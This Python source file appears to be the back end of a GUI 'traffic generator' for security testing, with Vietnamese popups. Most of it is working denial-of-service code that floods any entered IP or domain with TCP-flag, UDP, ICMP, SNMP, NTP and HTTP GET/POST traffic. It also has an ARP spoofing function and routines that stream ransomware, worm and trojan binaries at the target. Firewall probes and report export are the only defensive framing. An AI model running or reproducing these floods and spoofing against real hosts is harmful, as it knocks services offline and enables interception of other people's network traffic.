from matplotlib.pyplot import get
from scapy.all import *
import random
import string  
import secrets 
import re
import socket
import subprocess
from tkinter.filedialog import asksaveasfile
from tkinter.filedialog import askopenfile
from tkinter import messagebox
import docx
from datetime import datetime
import binascii
import os
import validators

class thread_with_trace(threading.Thread):
    def __init__(self, *args, **keywords):
        threading.Thread.__init__(self, *args, **keywords)
        self.killed = False 
    def start(self):
        self.__run_backup = self.run
        self.run = self.__run     
        threading.Thread.start(self)
    def __run(self):
        sys.settrace(self.globaltrace)
        self.__run_backup()
        self.run = self.__run_backup
    def globaltrace(self, frame, event, arg):
        if event == 'call':
            return self.localtrace
        else:
            return None
    def localtrace(self, frame, event, arg):
        if self.killed:
            if event == 'line':
                raise SystemExit()
        return self.localtrace
    def kill(self):
        self.killed = True        

def isRunning(self):
    if self.button_start.state=='disabled':
        return True
    return False

def ableRun(self):
    if isRunning(self) == True:
        messagebox.showinfo("Thông báo", "phần mềm đang chạy tấn công khác")
        return False
    if checkTrueInterface(self)==False:
        messagebox.showinfo("Thông báo", "Dữ liệu sinh không qua Interface này, vui lòng chọn đúng Interface")
        return False
    if IPcheck(str(self.target_entry.get()))==False:
            messagebox.showinfo("Thông báo", "IP không hợp lệ")
            return False
    return True
   
def menuChoice(self,choice):
    if ableRun(self) == True:
        self.BeginTime = getDatetimeNow()
        ip_target = str(self.target_entry.get())
        ip_target=fqdn_to_ip(ip_target)
        speed = int(self.speed_slider.get())
        self.button_start.config(state='disabled')
        self.button_start.hover=False
        self.button_start.configure(text_color = "black")   
        t = thread_with_trace(target = capture,args=(ip_target,self,str(self.network_adapter.get()),int(self.time_slider.get()), ))
        t.start()
        self.threads.append(t)
        if choice == 1:#UDP DoS
            messagebox.showinfo("Thông báo", "Tấn công UDP DoS")
            self.attack_scenario = "UDP DoS"
            t = thread_with_trace(target = udp,args=(ip_target,RandShort(),randData(), ))
            t.start()
            self.threads.append(t)
        if choice == 2:#TCP STREAM DoS
            messagebox.showinfo("Thông báo", "Tấn công TCP STREAM DoS")
            self.attack_scenario = "TCP STREAM DoS"
            t = thread_with_trace(target = tcp_stream,args=(ip_target,randData(),1 )  )
            t.start()
            self.threads.append(t)  
        if choice == 3:#HTTP Get DoS
            messagebox.showinfo("Thông báo", "Tấn công HTTP Get DoS")
            self.attack_scenario = "HTTP Get DoS"
            t = thread_with_trace(target = http,args=(ip_target,80,1,self,False, )  )
            t.start()
            self.threads.append(t)
        if choice == 4:#HTTP Post DoS
            messagebox.showinfo("Thông báo", "Tấn công HTTP Post DoS")
            self.attack_scenario = "HTTP Post DoS"
            t = thread_with_trace(target = http,args=(ip_target,80,2,self,False, )  )
            t.start()
            self.threads.append(t)
        if choice == 5:#TCP Xmas Flood
            messagebox.showinfo("Thông báo", "Tấn công TCP Xmas Flood")
            self.attack_scenario = "TCP Xmas Flood"
            for i in range(0,speed):
                t = thread_with_trace(target = tcp,args=(ip_target,RandShort(),"FSRPAUEC",randData() )  )
                t.start()
                self.threads.append(t)        
        if choice == 6:#TCP Syn Flood
            messagebox.showinfo("Thông báo", "Tấn công TCP Syn Flood")
            self.attack_scenario = "TCP Syn Flood"
            for i in range(0,speed):
                t = thread_with_trace(target = tcp,args=(ip_target,RandShort(),"S",randData() )  )
                t.start()
                self.threads.append(t)
        if choice == 7:#TCP ACK Flood
            messagebox.showinfo("Thông báo", "Tấn công TCP ACK Flood")
            self.attack_scenario = "TCP ACK Flood"
            for i in range(0,speed):
                t = thread_with_trace(target = tcp,args=(ip_target,RandShort(),"A",randData() )  )
                t.start()
                self.threads.append(t)
        if choice == 8:#TCP Syn-ACK Flood
            messagebox.showinfo("Thông báo", "Tấn công TCP Syn-ACK Flood")
            self.attack_scenario = "TCP Syn-ACK Flood"
            for i in range(0,speed):
                t = thread_with_trace(target = tcp,args=(ip_target,RandShort(),"SA",randData() )  )
                t.start()
                self.threads.append(t)
        if choice == 9:#TCP RST/FIN Flood
            messagebox.showinfo("Thông báo", "Tấn công TCP RST/FIN Flood")
            self.attack_scenario = "TCP RST/FIN Flood"
            for i in range(0,speed):
                t = thread_with_trace(target = tcp,args=(ip_target,RandShort(),"FR",randData() )  )
                t.start()
                self.threads.append(t)
        if choice == 10:#TCP ACK & PUSH Flood
            messagebox.showinfo("Thông báo", "Tấn công TCP ACK & PUSH Flood")
            self.attack_scenario = "TCP ACK & PUSH Flood"
            for i in range(0,speed):
                t = thread_with_trace(target = tcp,args=(ip_target,RandShort(),"PA",randData() )  )
                t.start()
                self.threads.append(t)
        if choice == 11:#Normal ICMP Flood
            messagebox.showinfo("Thông báo", "Tấn công Normal ICMP Flood")
            self.attack_scenario = "Normal ICMP Flood"
            for i in range(0,speed):
                t = thread_with_trace(target = icmp,args=(ip_target, )  )
                t.start()
                self.threads.append(t)
        if choice == 12:#Malformed ICMP Flood
            messagebox.showinfo("Thông báo", "Tấn công Malformed ICMP Flood")
            self.attack_scenario = "Malformed ICMP Flood"
            for i in range(0,speed):
                t = thread_with_trace(target = malform_icmp,args=(ip_target, )  )
                t.start()
                self.threads.append(t)   
        if choice == 13:#SNMP Flood
            messagebox.showinfo("Thông báo", "Tấn công SNMP Flood")
            self.attack_scenario = "SNMP Flood"
            for i in range(0,speed):
                t = thread_with_trace(target = snmp,args=(ip_target, )  )
                t.start()
                self.threads.append(t)
        if choice == 14:#NTP Flood
            messagebox.showinfo("Thông báo", "Tấn công NTP Flood")
            self.attack_scenario = "NTP Flood"
            for i in range(0,speed):
                t = thread_with_trace(target = ntp,args=(ip_target, )  )
                t.start()
                self.threads.append(t)
        if choice == 15:#ARP Broadcast Flood
            messagebox.showinfo("Thông báo", "ARP Broadcast Flood")
            self.attack_scenario = "ARP Broadcast Flood"
            for i in range(0,speed):
                t = thread_with_trace(target = broastcast,args=(ip_target, )  )
                t.start()
                self.threads.append(t)  
        if choice == 16:#UDP Flood
            messagebox.showinfo("Thông báo", "Tấn công UDP Flood")
            self.attack_scenario = "UDP Flood"
            for i in range(0,speed):
                t = thread_with_trace(target = udp,args=(ip_target,RandShort(),randData(), ))
                t.start()
                self.threads.append(t)
        if choice == 17:#Ransomware
            messagebox.showinfo("Thông báo", "Tấn công đính kèm Ransomware trong lưu lượng")
            self.attack_scenario = "Ransomware into Traffic"
            path = os.getcwd()
            path+="\\malware\\ransomware.bin"
            file = open(path,'rb')
            content = file.read()
            self.malware_gift= str(binascii.hexlify(content))
            t = thread_with_trace(target = tcp_stream,args=(ip_target,self.malware_gift,1 )  )
            t.start()
            self.threads.append(t)  
            if speed > 1:
                for i in range(1,speed): 
                    t = thread_with_trace(target = tcp_stream,args=(ip_target,self.malware_gift,0 )  )
                    t.start()
                    self.threads.append(t)  
            
        if choice == 18:#Worm
            messagebox.showinfo("Thông báo", "Tấn công đính kèm Worm trong lưu lượng")
            self.attack_scenario = "Worm into Traffic"
            path = os.getcwd()
            path+="\\malware\\worm.bin"
            file = open(path,'rb')
            content = file.read()
            self.malware_gift= str(binascii.hexlify(content))
            t = thread_with_trace(target = tcp_stream,args=(ip_target,self.malware_gift,1 )  )
            t.start()
            self.threads.append(t)  
            if speed > 1:
                for i in range(1,speed): 
                    t = thread_with_trace(target = tcp_stream,args=(ip_target,self.malware_gift,0 )  )
                    t.start()
                    self.threads.append(t)
        if choice == 19:#Trojan
            messagebox.showinfo("Thông báo", "Tấn công đính kèm Worm trong lưu lượng")
            self.attack_scenario = "Trojan into Traffic"
            path = os.getcwd()
            path+="\\malware\\trojan.bin"
            file = open(path,'rb')
            content = file.read()
            self.malware_gift= str(binascii.hexlify(content))
            t = thread_with_trace(target = tcp_stream,args=(ip_target,self.malware_gift,1 )  )
            t.start()
            self.threads.append(t)  
            if speed > 1:
                for i in range(1,speed): 
                    t = thread_with_trace(target = tcp_stream,args=(ip_target,self.malware_gift,0 )  )
                    t.start()
                    self.threads.append(t)
        if choice == 20:#Muldrop
            messagebox.showinfo("Thông báo", "Tấn công đính kèm Muldrop trong lưu lượng")
            self.attack_scenario = "Muldrop into Traffic"
            path = os.getcwd()
            path+="\\malware\\muldrop.bin"
            file = open(path,'rb')
            content = file.read()
            self.malware_gift= str(binascii.hexlify(content))
            t = thread_with_trace(target = tcp_stream,args=(ip_target,self.malware_gift,1 )  )
            t.start()
            self.threads.append(t)  
            if speed > 1:
                for i in range(1,speed): 
                    t = thread_with_trace(target = tcp_stream,args=(ip_target,self.malware_gift,0 )  )
                    t.start()
                    self.threads.append(t)
        if choice == 21:#Firewall TCP
            messagebox.showinfo("Lựa chọn chức năng", "Thăm dò tường lửa mục tiêu về khả năng phòng chống TCP DoS")
            self.attack_scenario = "Check Firewall anti-TCP DoS"
            t = thread_with_trace(target = check_tcp_fw,args=(ip_target,randData(),self, )  )
            t.start()
            self.threads.append(t)  
        if choice == 22:#Firewall HTTP Post
            messagebox.showinfo("Lựa chọn chức năng", "Thăm dò tường lửa mục tiêu về khả năng phòng chống HTTP Post DoS")
            self.attack_scenario = "Check Firewall anti-HTTP Post DoS"
            t = thread_with_trace(target = check_http_fw,args=(ip_target,80,self, )  )
            t.start()
            self.threads.append(t)

def guide():
    messagebox.showinfo("Instructions",
                        "1. Enter IP Address or Domain of Target as victim\n\
                         2. Choose fit interface\n\
                         3. choose Attack types\n\
                         4. Press Start Button to generate/logging traffic and Stop at anytime \n\
                         5. Save traffic log or generate Reports")

def about():
    messagebox.showinfo("Details", "Traffic Generator Tool made by\n Vu Nguyen Duy - Cyber Security Engineer from K16 MTA")

def checkTrueInterface(self):
    send(IP(dst="google.com")/ICMP(),count=10)
    temp = sniff(iface=str(self.network_adapter.get()), prn=lambda x: x.summary(),count=1,timeout=1)
    if len(temp) == 0:
        return False
    return True

def getDatetimeNow():
    now = datetime.now()
    return now.strftime("%d/%m/%Y %H:%M:%S")

def genReport(self):
    if self.label_count["text"] != "0" and self.button_stop.state=='disabled':
        files = [('Documents Files', '*.docx')]
        file = asksaveasfile(filetypes = files, defaultextension = files)
        if file is not None:
            doc = docx.Document()
            doc.add_heading('Generator Traffic Attack Reports', 0)
            doc.add_heading('Details:', 1)
            doc.add_heading('Ip Address/DNS Target  :\t'+ str(self.target_entry.get()), 3)
            doc.add_heading('Date Begin                        :\t'+ self.BeginTime, 3)
            doc.add_heading('Network Interface          :\t'+ str(self.network_adapter.get()), 3)
            
                
            if self.attack_scenario == "None":
                doc.add_heading('Enabled customizations:', 1)
                doc.add_heading('Layer 2', 2)
                if self.checkbox_arp.get()==1:
                    if self.arp_check.get()=="2":
                        doc.add_heading('\t+ LAN ARP Spoofing ', 3)
                    else:
                        doc.add_heading('\t+ ARP Broadcast ', 3)  
                doc.add_heading('Layer 3', 2)
                if self.icmp_check.get() =="2":
                    doc.add_heading('\t+ ICMP Flood ', 3)
                if self.icmp_check.get() =="3":
                    doc.add_heading('\t+ Malformed ICMP Flood ', 3)        
                doc.add_heading('Layer 4', 2)
                if self.checkbox_udp.get() == 1:
                    temp ="\t+ UDP Flood - Port:"
                    if self.UDP_port.get() == 1:
                        temp+="Random"
                    else:
                        temp+=str(self.udp_entry_port.get())
                    if self.UDP_data.get() == 1:
                        temp +=" - Data:Random" 
                    else:
                        temp +=" - Data:"
                        temp +=str(self.udp_entry_data.get())  
                    doc.add_heading(temp, 3)  
                if self.checkbox_tcp.get() == 1:
                    if str(self.tcp_type.get())=="1":
                        if str(self.tcp_ex.get())=="1":
                            doc.add_heading('\t+ SYN FLood Attack ', 3)  
                        else:     
                            doc.add_heading('\t+ XMas Flood Attack ', 3)  
                    else:
                        doc.add_heading('\t+ TCP Flood Custom Attack', 3) 
                        flag=""
                        if self.Flag_F.get()==1:
                            flag += "F,"     
                        if self.Flag_S.get()==1:
                            flag += "S," 
                        if self.Flag_R.get()==1:
                            flag += "R," 
                        if self.Flag_P.get()==1:
                            flag += "P," 
                        if self.Flag_A.get()==1:
                            flag += "A," 
                        if self.Flag_U.get()==1:
                            flag += "U," 
                        if self.Flag_E.get()==1:
                            flag += "E," 
                        if self.Flag_C.get()==1:
                            flag += "C,"
                        doc.add_heading('\t\t- Flag: '+ flag, 3)   
                        if self.TCP_port.get() == 1:
                            doc.add_heading('\t\t- Port: random', 3)
                        else:
                            doc.add_heading('\t\t- Port: '+str(self.tcp_entry_port.get()), 3)  
                        if self.TCP_data.get() == 1:
                            doc.add_heading('\t\t- Data: random', 3)
                        else:
                            doc.add_heading('\t\t- Data: '+ str(self.tcp_entry_data.get()) , 3)
                
                doc.add_heading('Layer 7', 2)
                if self.CheckNTP.get() == 1:
                    doc.add_heading('\t+ NTP Packets Flood ', 3)     
                if self.CheckSNMP.get() == 1:
                    doc.add_heading('\t+ SNMP Packets Flood ', 3)    
                if self.CheckHTTP.get() == 1:
                    doc.add_heading('\t+ HTTP Get Flood ', 3)    
                if self.CheckHTTP_2.get() == 1:
                    doc.add_heading('\t+ HTTP Post Flood ', 3) 
            elif self.attack_scenario == "Check Firewall anti-TCP DoS":
                doc.add_heading('Scenario:', 1)
                doc.add_heading("Name:\t\t" + self.attack_scenario, 3)
                doc.add_heading('Preventable:\t\t' +self.firewall_check_result, 3)    
            elif self.attack_scenario == "Check Firewall anti-HTTP Post DoS":
                doc.add_heading('Scenario:', 1)
                doc.add_heading("Name:\t\t" +self.attack_scenario, 3)
                doc.add_heading('Preventable:\t\t'+self.firewall_check_result, 3)    
            else:
                doc.add_heading('Scenario:', 1)
                doc.add_heading("Name:\t\t" +self.attack_scenario, 3)
            
            doc.add_heading('Traffic Specifications', 1)
            doc.add_heading('Bandwidth Average                      :\t'+ self.label_bandwidth["text"], 3)
            doc.add_heading('Traffic is generated (Data Size)  :\t'+ self.label_size["text"], 3)
            doc.add_heading('Total Packets                                 :\t'+ self.label_count["text"], 3)
            doc.add_heading('Interval                                           :\t'+ str(round(getTrafficInterVal(self.TrafficLog),2)) + " s", 3)
            doc.add_heading('Executor', 1)
            doc.add_heading('Name   :..........................', 3)
            doc.add_heading('Assess :..........................', 3)
            doc.add_heading('Note   :..........................', 3)
            doc.save(str(file.name))
            
            
    else:
        messagebox.showinfo("Thông báo", "chưa hoàn thành sinh lưu lượng")  

def has_mal_file(self):
    if self.malware_gift == "":
        return False
    return True

def select_malware_file(self):
        filetypes = (
            ('text files', '*.*'),
            ('text files', '*.txt')
        )
        file = askopenfile(mode ='r', filetypes =filetypes)
        if file is not None:
            if os.path.getsize(file.name) <= 10000000:   
                self.mal_file_name["text"]=str(os.path.basename(file.name)) 
                file1 = open(file.name,'rb')
                content = file1.read()
                self.malware_gift= str(binascii.hexlify(content))
               
                
            else:
                messagebox.showinfo("Thông báo", "vui lòng chọn file <10 mb")        
   
def saveToPcap(self):
    if self.label_count["text"] != "0" and self.button_stop.state=='disabled':
        files = [('Pcap Files', '*.pcap')]
        file = asksaveasfile(filetypes = files, defaultextension = files)
        if file is not None:
            wrpcap(str(file.name), self.TrafficLog)  
    else:
        messagebox.showinfo("Thông báo", "chưa hoàn thành sinh lưu lượng")  
            
def getSizeTraffic(packets):#bytes
    size = 0
    for i in range(0,len(packets)):
        size += len(packets[i])
    return size

def convertSize(size):
    if size>=1048576:
        size = size/1048576        #MB
    if size>=1024 and size<1048576:
        size = size/1024      #KB
    
    return round(size,2)

def sizeUnit(size):
    if size < 1024:
        return "Bytes"
    if size >= 1024 and size < 1048576:
        return "KB"
    if size >= 1048576:
        return "MB"
  
def getSumPackets(packets):
    return len(packets)
#X 
def getTrafficInterVal(packets):#second
    interval = packets[len(packets)-1].time-packets[0].time
    return interval

def getBandwidth(packets):#bps
    bandwidth = getSizeTraffic(packets)*8/getTrafficInterVal(packets)
    return bandwidth
   
def convertBandwidth(bandwidth):
    if bandwidth>=1000000:
        bandwidth = bandwidth/1000000      #Mbps
    elif bandwidth>=1000:
        bandwidth = bandwidth/1000      #Kbps
    
    return round(bandwidth,2)
    
def bandwidthUnit(bandwidth):
    if bandwidth < 1000:
        return "Bps"
    if bandwidth >= 1000 and bandwidth < 1000000:
        return "Kbps"
    if bandwidth >= 1000000:
        return "Mbps"                 

def getNetworkAdapterName():
    string= str(subprocess.check_output("ipconfig"))
    cut = string.split('\\n')
    result = []
    for i in cut:
        temp= re.search(r'(?<=adapter )(.*)(?=:)', i)
        if temp != None:
            result.append(temp.group())
    return result

def IPcheck(host):
    if host =="127.0.0.1" or host == "localhost" or host == "":
        return False
    if IPvalid(host)== False:
        if domainValid(host)== False:
            return False    
    if is_fqdn(host)== False:
        return False
    return True

def is_fqdn(host):
    try:
        host = host.replace("https://", "").replace("http://", "").replace("www.", "")
        socket.gethostbyname(host)
    except socket.gaierror:
        return False
    return True

def domainValid(hostname):
    if validators.domain(hostname):
        return True
    return False

def IPvalid(ip):
    regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
    if(re.search(regex, ip)):
        return True
    return False

def fqdn_to_ip(fqdn):
    fqdn = fqdn.replace("https://", "").replace("http://", "").replace("www.", "")
    return socket.gethostbyname(fqdn)
   
def portValid(port):
    if port.isdigit() and (1 <= int(port) <= 65535):
        return True
    return False
       


    
def Beginable(self):
    if self.checkbox_arp.get() == 1 :
        return True    
    if self.icmp_check.get() == "2" :
        return True
    if self.icmp_check.get() == "3" :
        return True     
    if self.checkbox_udp.get() == 1 :
        return True    
    if self.checkbox_tcp.get() == 1 :
        return True   
    if self.CheckNTP.get() == 1 :
        return True    
    if self.CheckSNMP.get() == 1 :
        return True   
    if self.CheckHTTP.get() == 1 :
        return True
    if self.CheckHTTP_2.get() == 1 :
        return True       
    return False
    
def randData():
    output = ''.join(secrets.choice(string.ascii_letters + string.digits + string.punctuation) for x in range(random.randint(10, 50)))
    return str(output)

def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data

def get_mac(ip):
    """
    Returns MAC address of any device connected to the network
    If ip is down, returns None instead
    """
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

def broastcast(target_ip):
    send(ARP(pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff', psrc=target_ip, op='is-at'), verbose=0,loop=1)

def arp_spoof(target_ip, host_ip,verbose=True):
    target_mac = get_mac(target_ip)
    while True:
        send(ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at'), verbose=0)
        if verbose:
            self_mac = ARP().hwsrc
            print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
   
def icmp(target):
    send(IP(dst=target)/ICMP(),loop=1)

def malform_icmp(target):
  while True:
    if random.randint(1, 8)>=5:
        send(IP(dst=target, ihl=2, version=3)/ICMP()) 
    else: 
        ARP_Packet = ARP()
        ARP_Packet.sport = RandShort()
        ARP_Packet.dport = RandShort(),
        ARP_Packet.flags = "S"
        ARP_Packet.seq = RandShort()
        ARP_Packet.window = RandShort()
        send(IP(dst=target,src=RandShort())/ARP_Packet)

def udp(ip,targetPort,data):
    #send(IP(dst=target)/UDP(dport=targetPort,sport=RandShort())/data,loop=1)
    dos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
    dos.connect((ip,targetPort)) 
    while True:
        dos.send(data.encode())  		 
    
def tcp_stream(ip,data,popup):
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    dos.connect((ip,443)) 
    while True:
        try:
            dos.send(data.encode())
        except:
            dos.close()
            if popup ==1:
                messagebox.showinfo("Thông báo", "TCP traffic Bị firewall mục tiêu chặn")            
            break

def check_tcp_fw(ip,data,self):
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    dos.connect((ip,443)) 
    check = False
    for i in range(1,200): 
        print(i)
        try:
            dos.send(data.encode())
        except:
            dos.close()
            messagebox.showinfo("Kết quả thăm dò", "TCP traffic Bị firewall mục tiêu chặn")  
            self.firewall_check_result = "Yes"
            check = True          
            break
    if check == False:
        self.firewall_check_result = "No"
        messagebox.showinfo("Kết quả thăm dò", "Firewall mục tiêu không có cơ chế chống TCP traffic DoS")       
   
def tcp(ip,port,flag,data):
    send(IP(dst=ip)/TCP(dport=port,flags=flag,
          seq=RandShort(),ack=RandShort(),sport=RandShort())/data ,loop=1)
        
def snmp(target):
    
    targetPort = 161
    send(IP(dst=target)/UDP(dport=targetPort,sport=RandShort())/SNMP(version=3, community="private", 
            PDU=SNMPget(varbindlist= [SNMPvarbind(oid="1.2.3",value="test")])),loop=1)
   
def ntp(target):
    targetPort = 123
    if random.randint(1, 8)>=5:
        send(IP(dst=target)/UDP(dport=targetPort,sport=RandShort())/("\x1b\x00\x00\x00"+"\x00"*11*4),loop=1)
    else:
        send(IP(dst=target)/UDP(dport=targetPort,sport=RandShort())/NTP(),loop=1)    

def http(ip,port,type,self,mal):
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    dos.connect((ip, port)) 
    url_path = generate_url_path()
    method=""
    if type==1: 
        method="GET"
    else:
        method="POST"
    if mal == False:
        byt = (f"{method} /{url_path} HTTP/1.1\nHost: {ip}\n\n").encode()
    else:
        byt = (f"{method} /{url_path} HTTP/1.1\nHost: {ip}\nContent-Type: application/octet-stream\nAccept: */*\n\n"+self.malware_gift).encode()
    while True:
        try:
            dos.send(byt)
        except:
            dos.close()
            messagebox.showinfo("Thông báo", "HTTP POST traffic Bị firewall mục tiêu chặn")
            break
def check_http_fw(ip,port,self):
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    dos.connect((ip, port)) 
    url_path = generate_url_path()
    method="POST"
    byt = (f"{method} /{url_path} HTTP/1.1\nHost: {ip}\n\n").encode()
    check = False
    for i in range(1,200): 
        print(i)
        try:
            dos.send(byt)
        except:
            dos.close()
            messagebox.showinfo("Kết quả thăm dò", "HTTP POST traffic Bị firewall mục tiêu chặn")
            self.firewall_check_result = "Yes"
            check = True
            break          
    if check == False:
        self.firewall_check_result = "No"
        messagebox.showinfo("Kết quả thăm dò", "Firewall mục tiêu không có cơ chế chống traffic HTTP Post DoS")          
    
        
def caculator(self,capture):
    bandwidth = getBandwidth(capture)
    size = getSizeTraffic(capture)
    self.label_bandwidth["text"] = str(convertBandwidth(bandwidth)) + " " + bandwidthUnit(bandwidth)
    self.label_size["text"] = str(convertSize(size)) + " " + sizeUnit(size)
    self.label_count["text"] = str(getSumPackets(capture))
        

def capture(ip,self,interface,time):
    condition="host "+ip
    capture = sniff(filter=condition, iface=interface, prn=lambda x: x.summary(),count=1)
    
    if self.button_start.state=='disabled':
        capture1= sniff(filter=condition, iface=interface, prn=lambda x: x.summary(),timeout=time)
        print("CAPTURE FINISH")
        self.button_stop.configure(text_color = "white")
        self.button_stop.configure(hover_color = "red")
        self.button_stop.config(state='enabled')
        self.button_stop.hover=True
        capture = capture + capture1
        self.TrafficLog = capture    
        caculator(self,capture)
        
    # while self.button_stop.state=='enabled':
       
    #     capture1= sniff(filter=condition, iface=interface, prn=lambda x: x.summary(),count=1)
    #     capture = capture + capture1
    #     self.TrafficLog = capture
        
    #     bandwidth = getBandwidth(self.TrafficLog)
    #     size = getSizeTraffic(self.TrafficLog)
    #     self.label_bandwidth["text"] = str(convertBandwidth(bandwidth)) + " " + bandwidthUnit(bandwidth)
    #     self.label_size["text"] = str(convertSize(size)) + " " + sizeUnit(size)
    #     self.label_count["text"] = str(getSumPackets(self.TrafficLog))
    
# def capture_pyshark(ip,self,interface):
#     condition="host "+ip

    
#     if self.button_stop.state=='enabled':
#         capture = pyshark.LiveCapture(interface=interface,bpf_filter=condition)
#         capture.sniff(timeout=5)
#         print(capture)
#         print("SUCCESS")
#         self.TrafficLog = capture        
